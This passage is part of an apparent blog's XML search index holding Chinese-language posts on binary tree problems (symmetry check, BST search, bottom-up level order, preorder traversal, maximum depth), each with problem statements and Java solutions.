<span class="token operator">&amp;&amp;</span>        <span class="token function">isSymmetric</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>left<span class="token punctuation">,</span> t<span class="token punctuation">.</span>right<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isSymmetric</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>right<span class="token punctuation">,</span> t<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">return</span> s <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span> t <span class="token operator">==</span> null<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isSymmetricTreeRecursive</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">isSymmetric</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">,</span> root<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isSymmetricTreeIterative</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    Stack<span class="token operator">&lt;</span>TreeNode<span class="token operator">></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>    stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      TreeNode s <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> t <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span> t <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">==</span> null <span class="token operator">||</span> t <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">.</span>val <span class="token operator">!=</span> t<span class="token punctuation">.</span>val<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>      stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>      stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>      stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>      stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二叉搜索树中查找数字</title>
      <link href="/2018/12/28/suan-fa/er-cha-shu/er-cha-sou-suo-shu-zhong-cha-zhao-shu-zi/"/>
      <url>/2018/12/28/suan-fa/er-cha-shu/er-cha-sou-suo-shu-zhong-cha-zhao-shu-zi/</url>
      
        <content type="html"><![CDATA[<h2 id="二叉搜索树中查找数字"><a href="#二叉搜索树中查找数字" class="headerlink" title="二叉搜索树中查找数字"></a>二叉搜索树中查找数字</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一棵二叉搜索树和一个数字，你要在二叉搜索树上找到这个数字，并返回它所在的节点。如果找不到这个数字，就返回空指针。</p><pre class=" language-markdown"><code class="language-markdown">二叉搜索树的定义是：  <span class="token list punctuation">1.</span> 左子树所有节点上的值都小于根节点上的值  <span class="token list punctuation">2.</span> 右子树所有节点上的值都大于根节点上的值  <span class="token list punctuation">3.</span> 左右子树同时也为二叉搜索树比如说，给你的二叉搜索树是：<span class="token code keyword">     8</span><span class="token code keyword">    / \</span>   2  16  / \ 1   4给你的数字是 1。1 在这棵二叉搜索树里，因此你要返回节点 1。如果给你的数字是 42，不在这棵树中，则返回空指针。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TreeNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    TreeNode left<span class="token punctuation">;</span>    TreeNode right<span class="token punctuation">;</span>    <span class="token function">TreeNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(h), Space: O(h)</span>  <span class="token keyword">public</span> TreeNode <span class="token function">searchBSTRecursive</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">,</span> <span class="token keyword">int</span> val<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> null <span class="token operator">||</span> val <span class="token operator">==</span> root<span class="token punctuation">.</span>val<span class="token punctuation">)</span> <span class="token keyword">return</span> root<span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">&lt;</span> root<span class="token punctuation">.</span>val<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">searchBSTRecursive</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token function">searchBSTRecursive</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(h), Space: O(1)</span>  <span class="token keyword">public</span> TreeNode <span class="token function">searchBSTIterative</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">,</span> <span class="token keyword">int</span> val<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>root <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> val <span class="token operator">!=</span> root<span class="token punctuation">.</span>val<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">&lt;</span> root<span class="token punctuation">.</span>val<span class="token punctuation">)</span> root <span class="token operator">=</span> root<span class="token punctuation">.</span>left<span class="token punctuation">;</span>      <span class="token keyword">else</span> root <span class="token operator">=</span> root<span class="token punctuation">.</span>right<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> root<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二叉树的逆层序遍历</title>
      <link href="/2018/12/28/suan-fa/er-cha-shu/er-cha-shu-de-ni-ceng-xu-bian-li/"/>
      <url>/2018/12/28/suan-fa/er-cha-shu/er-cha-shu-de-ni-ceng-xu-bian-li/</url>
      
        <content type="html"><![CDATA[<h2 id="二叉树的逆层序遍历"><a href="#二叉树的逆层序遍历" class="headerlink" title="二叉树的逆层序遍历"></a>二叉树的逆层序遍历</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一棵二叉树，要求你<strong>从叶子节点到根节点</strong>一层一层地对其进行访问，对于每一层的节点，则是从左向右进行访问。将访问的结果以二维数组返回。</p><p>这道题目和二叉树层序遍历的唯一区别是，它是从下向上一层一层去访问的。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的二叉树是：<span class="token code keyword">     1</span>   /   \  2     4<span class="token code keyword">       / \</span><span class="token code keyword">      8  16</span>它的逆层序遍历结果是：[ [8, 16]， [2, 4], [1],]</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TreeNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    TreeNode left<span class="token punctuation">;</span>    TreeNode right<span class="token punctuation">;</span>    <span class="token function">TreeNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> <span class="token function">levelOrderTraversalFromBottom</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Queue<span class="token operator">&lt;</span>TreeNode<span class="token operator">></span> q <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    q<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> elem <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> size <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>        TreeNode s <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        elem<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">.</span>left <span class="token operator">!=</span> null<span class="token punctuation">)</span> q<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">.</span>right <span class="token operator">!=</span> null<span class="token punctuation">)</span> q<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>elem<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> result<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">int</span> j <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> i<span class="token punctuation">;</span>      List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> tmp <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>      result<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> result<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      result<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二叉树前序遍历</title>
      <link href="/2018/12/28/suan-fa/er-cha-shu/er-cha-shu-qian-xu-bian-li/"/>
      <url>/2018/12/28/suan-fa/er-cha-shu/er-cha-shu-qian-xu-bian-li/</url>
      
        <content type="html"><![CDATA[<h2 id="二叉树前序遍历"><a href="#二叉树前序遍历" class="headerlink" title="二叉树前序遍历"></a>二叉树前序遍历</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个二叉树，你要返回一个数组，表示二叉树前序遍历的结果。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的二叉树是：<span class="token code keyword">    1</span>   / \  2   3   \<span class="token code keyword">    4</span>   /  5你要返回的前序遍历结果是：1, 2, 4, 5, 3</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TreeNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    TreeNode left<span class="token punctuation">;</span>    TreeNode right<span class="token punctuation">;</span>    <span class="token function">TreeNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">preorder</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> result<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">preorder</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">preorder</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> <span class="token function">preorderTraversalRecursive</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">preorder</span><span class="token punctuation">(</span>root<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> <span class="token function">preorderTraversalIterative</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Stack<span class="token operator">&lt;</span>TreeNode<span class="token operator">></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>root <span class="token operator">!=</span> null <span class="token operator">||</span> <span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span>root <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>        root <span class="token operator">=</span> root<span class="token punctuation">.</span>left<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      root <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>right<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> <span class="token function">preorderTraversalIterative2</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> result<span class="token punctuation">;</span>    Stack<span class="token operator">&lt;</span>TreeNode<span class="token operator">></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      TreeNode node <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>right <span class="token operator">!=</span> null<span class="token punctuation">)</span> stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>left <span class="token operator">!=</span> null<span class="token punctuation">)</span> stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二叉树的最大深度</title>
      <link href="/2018/12/28/suan-fa/er-cha-shu/er-cha-shu-de-zui-da-shen-du/"/>
      <url>/2018/12/28/suan-fa/er-cha-shu/er-cha-shu-de-zui-da-shen-du/</url>
      
        <content type="html"><![CDATA[<h2 id="二叉树的最大深度"><a href="#二叉树的最大深度" class="headerlink" title="二叉树的最大深度"></a>二叉树的最大深度</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一棵二叉树，你要找到从根节点到最远叶子节点的深度。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的二叉树是<span class="token code keyword">    1</span>  /   \ 2     4<span class="token code keyword">      / \</span><span class="token code keyword">     8  16</span>这棵树有 3 个叶子节点，分别是 2，8，16。最远的叶子节点是 8 和 16，根节点到 8 或 16 都有 3 个节点，因此最大深度是 3。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TreeNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    TreeNode left<span class="token punctuation">;</span>    TreeNode right<span class="token punctuation">;</span>    <span class="token function">TreeNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: (n)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">maxDepth</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token function">maxDepth</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">maxDepth</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">maxDepthIterative</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    Queue<span class="token operator">&lt;</span>TreeNode<span class="token operator">></span> q <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    q<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> depth <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">int</span> size <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>        TreeNode s <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">.</span>left <span class="token operator">!=</span> null<span class="token punctuation">)</span> q<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">.</span>right <span class="token operator">!=</span> null<span class="token punctuation">)</span> q<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token operator">++</span>depth<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> depth<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java几种常用JSON库性能比较</title>
      <link href="/2018/12/28/chang-yong-gong-ju/java-ji-chong-chang-yong-json-ku-xing-neng-bi-jiao/"/>
      <url>/2018/12/28/chang-yong-gong-ju/java-ji-chong-chang-yong-json-ku-xing-neng-bi-jiao/</url>
      
